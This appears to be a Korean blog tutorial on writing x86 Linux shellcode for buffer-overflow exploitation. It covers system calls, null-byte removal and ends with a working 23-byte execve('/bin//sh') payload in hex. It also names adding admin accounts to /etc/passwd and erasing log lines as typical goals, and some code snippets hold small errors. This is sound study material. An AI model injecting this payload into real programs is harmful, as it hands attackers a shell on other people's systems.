---
title : 쉘코드 만들기
categories : [Hacking, System]
tags : [BOF, shellcode 만들기, shellcode, system call]
---

## Shellcode
<hr style="border-top: 1px solid;">

<br><br>

셸코드는 프로그램의 제어권을 가져오는 훌륭한 방법이다. 그 쎌에서는 프로그램이 할 수 있는 모든 것을 할 수 있다.

셸코드를 맞춤제작 할 수 있다면 공격한 프로그램의 권한을 완벽하게 가져올 수 있다.

보통 셸코드가 ```/etc/passwd```에 관리자 계정을 추가하거나 로그 파일의 해당 줄을 자동으로 지우길 원할 것이다. 맞춤 셸코드를 작성할 수 있다면 하고자 하는 것들을 모두 할 수 있다.

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Assembly와 C
<hr style="border-top: 1px solid;">

<br><br>

셸코드 바이트는 아키텍쳐마다 다른 기계어로 셸코드는 어셈블리어로 작성한다. 어셈블리어로 작성하는 것은 C로 작성하는 것과 다르지만 기본 원리는 비슷하다.

운영체제가 커널에서의 입출력, 프로세스 제어, 파일 접근, 네트워크 통신 등을 관리한다. 

컴파일된 C 프로그램은 궁극적으로는 커널로 시스템 콜을 함으로써 이런 작업들을 수행한다. 시스템 콜은 운영체제마다 다르다.

<br>

C에서는 표준 라이브러리가 제공된다.   라이브러리가 다양한 아키텍쳐에 맞는 시스템 콜을 알고 있다.    그래서 라이브러리를 통해 C 프로그램은 여러 시스템에서 컴파일 될 수 있다.

x86 프로세서에서 컴파일된 C 프로그램은 x86 어셈블리어를 생성한다. 어셈블리어는 어느 특정 프로세서 아키텍처용이라고 정해져 있다. 그래서 호환성이 없다.

호환성 있는 표준 라이브러리는 없다. 대신 커널 시스템 콜을 직접 호출할 수 있다.

<br>

```c
int main() {
  printf("hello world!\n");
}
```

<br>

위의 C 코드를 컴파일 할 때, 표준 라이브러리를 거쳐 문자열을 출력하는 ```write()``` 시스템 콜을 호출한다. 
: ```write(1, "hello world!\n", 13)```

<br>

```
write - write to a file descriptor

#include <unistd.h>

ssize_t write(int fd, const void *buf, size_t count)
```

<br>

+ fd : file descriptor
  + 0 : STANDARD INPUT
  + 1 : STANDARD OUTPUT
  + 2 : STANDARD ERROR OUTPUT

+ buf : 문자열 포인터

+ count : 문자열 길이

<br><br>
<hr style="border: 2px solid;">
<br><br>

## System Call
<hr style="border-top: 1px solid;">

<br><br>

모든 가능한 리눅스 시스템 콜은 숫자로 나열돼 있다. 그래서 어셈블리로 시스템 콜을 할 때 숫자로 참조 가능하다.

이 시스템 콜은 ```/usr/include/asm-i386/unistd.h```에 열거돼 있다. 

예를 들어, exit()와 write()는 아래와 같이 정의되어 있다.

<br>

```c
#define __NR_exit     1
#define __NR_write    4
```

<br>

어셈블리 명령어 중 mov, int를 통해 시스템 콜을 호출 가능하다.

+ ```mov <dst> <src>``` : src의 값을 dst로 복사한다.

+ ```int <signal>``` : 커널로 인터럽트 시그널을 보낸다. **```int 0x80```은 커널에게 시스템 콜을 하는 데 사용된다.**

<br>

```int 0x80``` 명령이 실행되면 커널은 네 개의 레지스터를 기반으로 시스템 콜을 만든다. 모든 레지스터는 mov 명령으로 설정된다.

<br>

+ EAX 레지스터는 시스템 콜을 명시하는 데 사용된다. (시스템 콜 값)

+ EBX, ECX, EDX 레지스터는 첫 번째, 두 번재, 세 번째 인자를 시스템 콜에 묶어두는 데 사용된다.

<br>

위의 C코드를 어셈블리 코드로 만들면 아래와 같다. 

```assembly
; hello.asm

section .data     ; data segment
msg     db      "hello, world!", 0x0a   ; string and new line

section .text   ; text segment
global _start   ; ELF 링킹을 위한 초기 엔트리 포인트

_start:

; SYSCALL: write(1, msg, 14)
mov eax, 4        ; write 시스템 콜 값은 4이므로 eax에 4을 넣음
mov ebx, 1        ; 첫 번째 인자 1
mov ecx, msg      ; 두 번째 인자 msg
mov edx, 14       ; 세 번재 인자 14(hello, world!\n)
int 0x80          ; 시스템 콜 호출

; SYSCALL: exit(0)
mov eax,1
mov ebx,0
int 0x80  
```

<br>

![image](https://user-images.githubusercontent.com/52172169/153008394-80a5edbe-bb56-4daa-b943-d00b82054574.png)

<br>

실행 바이너리를 만들려면 이 어셈블리 코드는 먼저 어셈블돼 실행 가능한 형식으로 링크돼야 한다. 컴파일러가 이 모든 과정을 자동으로 수행한다.

ELF 바이너리를 생성하려면 링커에게 어셈블리 명렁이 어디서부터 시작하는지 알려주는 ```global _start```줄이 필요하다.

어셈블리 코드를 어셈블하여 object 파일로 만들고 object 파일을 링커 프로그램을 통해 실행 가능한 바이너리를 만들어낸다.

<br>

위의 어셈블리 코드는 셸코드가 아니다. 혼자 동작하기 때문이다.

셸코드는 혼자 동작하지도 않고 링킹도 반드시 필요하다. 

<br>

Assembly 변수 선언 참고
: <a href="https://ffoorreeuunn.tistory.com/48" target="_blank">ffoorreeuunn.tistory.com/48</a>

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Shellcode 만들기
<hr style="border-top: 1px solid;">

<br><br>

셸코드는 실제로 실행 가능한 프로그램은 아니므로 셸코드를 작성할 때 메모리상 데이터 배치나 메모리 세그먼트에 신경 쓰지 않아도 된다.

**명령은 스스로 동작하고, 프로세서의 현재 상태에 관계없이 제어권을 가져올 수만 있으면 된다.** 그래서 셸코드는 위치 독립적 코드라 볼 수 있다.

<br>

위의 코드를 셸코드로 만드려면 셸코드에서 ```hello world!``` 문자열 바이트는 어셈블리 명령 바이트와 섞여 있어야 한다.

정의 가능하거나 예측 가능한 메모리 세그먼트가 없기 때문이다. 이는 EIP가 문자열을 기계어 명령으로 변환하려 하지 않는 동안은 괜찮지만 데이터로 문자열에 접근하려면 문자열 포인터가 필요하다.

하지만 셸코드가 실행될 때는 셸코드는 메모리상 어디에라도 위치할 수 있다. 그래서 **문자열의 절대 메모리 주소는 EIP에 상대적 주소로 계산될 필요가 있다.**

그런데 어셈블리 명령으로 EIP에 접근할 수 없으므로 약간의 기교가 필요하다.

<br><br>

스택을 이용하는 방법이 있다. 스택은 x86 아키텍쳐를 구성하는 데 꼭 필요한 요소로 스택 명령을 위한 특수 명령이 있다.

<br>

+ ```push <source>``` : 스택에 source 오퍼랜드 푸시

+ ```pop <destination>``` : 스택으로부터 값을 pop하여 목적 오퍼랜드에 저장

+ ```call <location>``` 

  : 위치 오퍼랜드의 주소로 실행을 점프시켜 함수를 호출, **나중에 리턴하기 위해 호출 다음의 명령 주소를 스택에 푸시**

+ ```ret``` : 스택으로부터 리턴 주소를 pop하고 그 곳으로 점프하여 함수에서 리턴

<br>

스택 기반 공격은 call과 ret 명령을 이용한다. 

함수가 호출될 때 다음 명령의 주소를 리턴값으로 하므로 스택에 푸쉬, 함수가 끝난 후에는 ret 명령어로 리턴 주소를 팝하고, EIP를 그 곳으로 점프시킨다.

**여기서 ret 명령 수행 전에 스택에 저장된 리턴 주소를 덮어씀으로써 프로그램 실행 제어권을 가져올 수 있다.**

```Hello, world!"```를 출력하게 하는 셸코드를 제작해보면 아래와 같다.

<br>

```assembly

  call func
  db "Hello, world!", 0x0a, 0x0d

func:
; ssize_t write(int fd, const void *buf, size_t count)
  pop ecx       ; ecx에 리턴 주소(문자열 주소) 저장
  mov eax, 4    ; write system call number
  mov ebx, 1    ; fd = 1
  mov edb, 15   ; count = 15
  int 0x80      ; system call

; exit(0)
  mov eax, 1
  mov ebx, 0
  int 0x80
```

<br>

call 명령을 실행하면 다음 명령의 주소가 스택에 푸쉬된다. 리턴 주소는 즉각 스택에서 팝돼 적절한 레지스터에 저장된다. 

어떤 메모리 세그먼트도 사용하지 않고 이 기본 명령을 기존 프로세스에 삽입해 완전히 위치 독립적인 방법으로 실행했다. 

즉, 이 명령들이 변환될 때 명령들은 실행 파일로 링크될 수 없다.

<br>

이 셸코드를 삽입해보면 ```Segmentation fault```가 뜬다. GDB로 조사해보면 이유를 알 수 있다.

프로그램이 충돌했을 때 메모리가 코어 파일(core dump)로 덤프되는데 그 파일을 조사해보면 된다.

<br>

보통 문자열은 널바이트(0x00)로 끝나는데, 셸이 문자열의 널 바이트를 제거하면은 기계어 코드를 해석할 수 없다. 

취약한 프로그램은 ```strcpy``` 함수를 통해 셸코드가 문자열로 프로세스에 삽입되는데 ```strcpy```는 첫 번째 널 바이트에서 끝나므로 완전하지 못한 셸코드가 들어가게 된다.

**따라서 제대로 사용하려면 널 바이트를 제거해야 한다.**

<br>

널 바이트를 제거하는 방법에는 2의 보수를 이용(음수 값을 이용)하거나 작은 레지스터를 이용```(AX, BX, AL, AH, BL, BH)```하거나 ```xor``` 명령어를 통해 제거할 수 있다. 

call 명령어를 사용하면 점프를 하게 되는데 점프하는 바이트 수가 너무 적다면 널 바이트가 생기게 되므로 멀리 점프를 해주거나 멀리 갔다가 뒤로 돌아가는 (음수 값이 들어감) 방식으로 해야 한다.

<br>

```assembly
jmp short one

two :
  pop ecx
  xor eax, eax
  mov al, 4
  xor ebx, ebx
  inc ebx
  xor edx, edx
  mov edx, 15
  int 0x80
  
  mov al, 1
  dec ebx
  int 0x80

one :
  call two
  db "Hello, world!", 0x0a, 0x0d
```

<br>
<br>

위의 어셈블리 코드를 어셈블하면 널바이트가 없는 걸 확인할 수 있다. 따라서 이 코드를 바이트로 변환해서 넣어주면 ```Hello world!\n```를 출력할 것이다.

<br>

셸을 생성하는 쉘코드를 만드려면 ```system("/bin/sh")```를 실행시켜야 한다. 

시스템 콜 함수에 11번을 보면 ```execve()``` 함수가 있는데 이 함수로 실행시킬 수 있다.

<br>

```
execve - execute program

#include <unistd.h>

int execve(const char *filename, char *const argv[], char *const envp[])


filename : 파일명

argv[] : 비어있어도 되나 널로 끝나야 함.

envp[] : 환경 배열은 비어있어도 되나 32비트 널 포인터로 끝나야 함.
```

<br>

C로 짜면 아래와 같다.

<br>

```
#include <unistd.h>

int main()
{
    char filename[] = "/bin/sh\x00";
    char **argv, **env;
    
    argv[0] = filename;
    argv[1] = 0;
    
    envp[0] = 0;
    
    execve(filename, argv, envp);
}
```

<br>



system("/bin/sh")에서 system 함수는 내부적으론 execve 함수를 호출 
execve 함수는 또 내부적으로 system call을 호출 


<br><br>
<hr style="border: 2px solid;">
<br><br>

## 어셈블리어로 작성
**32, 64bit linux system call table**   
<a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md" target="_blank">chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md</a>  
![](/assets/images/syscall_execve.png){: .align-center}  
제작 사이트 : <a href="https://defuse.ca/online-x86-assembler.htm" target="_blank">https://defuse.ca/online-x86-assembler.htm</a>  
위 사이트는 인텔로 작성해줘야 함. 아마 변환과정에서 알아서 AT&T로 해주는 듯.

**execve("/bin//sh",0,0)를 호출하는 어셈블리어 코드**  
```
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
xor edx, edx
movb eax, 0xb
int 0x80
```
```
\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x31\xC9\x31\xD2\xB0\x0B\xCD\x80

길이 : 23
```
```
Disassembly

0:  31 c0                   xor    eax,eax
2:  50                      push   eax
3:  68 2f 2f 73 68          push   0x68732f2f
8:  68 2f 62 69 6e          push   0x6e69622f
d:  89 e3                   mov    ebx,esp
f:  31 c9                   xor    ecx,ecx
11: 31 d2                   xor    edx,edx
13: b0 0b                   mov    al,0xb
15: cd 80                   int    0x80
```

### 해석
```
xor 부분은 null byte 제거를 위해 해주는 것. 
null byte가 있으면 쉘 코드가 종료될 수 도 있음.
```
```
push eax          # 현재 값이 0이므로 문자열 마지막 null을 뜻함. 
push 0x68732f2f   # "//sh", little endian이므로 거꾸로 해준 것.
push 0x6e69622f   # "/bin", 거꾸로 해준 것.
mov ebx, esp      # push를 해주면 esp가 변경이 되므로(이렇게 하면 "/bin"에 위치)
                  # 문자열의 주소를 ebx에 전달해주는 것.
```
```
xor ecx, ecx
xor edx, edx

# null byte 제거와 동시에 ecx, edx에 값을 0을 주는 것.
```
```
movb eax, 0xb     # execve를 호출하기 위해 고유 번호인 0xb를 저장.
int 0x80          # system call을 호출하는 것.
```

### /bin/sh와 /bin//sh 차이점
출처 : <a href="https://htst.tistory.com/71" target="_blank">https://htst.tistory.com/71</a>
```
/bin/sh는 7바이트이므로 8바이트를 맞춰주기 위해 /bin//sh로 한 것.
```
